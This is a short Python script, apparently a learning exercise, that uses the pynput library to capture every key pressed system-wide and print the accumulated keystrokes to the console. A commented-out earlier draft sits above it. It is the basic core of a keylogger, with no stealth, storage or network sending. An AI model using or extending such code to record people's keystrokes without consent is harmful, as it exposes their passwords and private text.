# #!/usr/bin/env python
# import pynput.keyboard
#
#
# def process_key_press(key):
#     print(key)
#
#
# keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
# with keyboard_listener:
#     keyboard_listener.join()


# !/usr/bin/env python3

from pynput import keyboard

log = ""
def on_press(key):
    global log
    try:
        log = log + str(format(key.char))
        print(log)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " "+str(key)+" "
        print(log)

with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
